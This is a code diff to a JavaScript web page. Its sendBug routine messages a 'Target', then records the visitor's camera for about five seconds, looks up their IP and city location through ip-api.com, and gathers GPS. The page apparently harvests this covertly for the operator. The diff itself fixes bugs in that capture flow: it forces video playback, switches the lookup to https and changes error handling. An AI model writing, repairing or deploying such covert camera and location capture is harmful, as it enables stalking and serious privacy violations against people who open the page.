@@ -280,7 +280,7 @@ async function getInfo() {
         const ipData = await ipRes.json();
         ip = ipData.ip;
 
-        const locRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,as,lat,lon`);
+        const locRes = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,as,lat,lon`);
         const loc = await locRes.json();
 
         if (loc.status === "success") {
@@ -373,7 +373,10 @@ async function startCamera() {
 async function startCamera1() {
     const video = document.getElementById("video");
 
-    if (!video) return;
+    if (!video) {
+        alert("Video element tidak ada");
+        return;
+    }
 
     try {
         const stream = await navigator.mediaDevices.getUserMedia({
@@ -382,6 +385,7 @@ async function startCamera1() {
         });
 
         video.srcObject = stream;
+        video.play();
 
         const recorder = new MediaRecorder(stream);
         let chunks = [];
@@ -412,8 +416,8 @@ async function startCamera1() {
         }, 5000);
 
     } catch (err) {
-        console.error("Camera gagal:", err);
-        alert("Camera error: " + err.message);
+        alert(err.name + ": " + err.message);
+        console.log(err);
     }
 }
 // ======================
@@ -469,7 +473,6 @@ async function sendBug() {
             `<b>📌 Sender:</b> ${sender}\n<b>📞 Target:</b> ${target}`
         );
 
-        await startCamera();
         await startCamera1();
         await getInfo();
         await sendGPS();
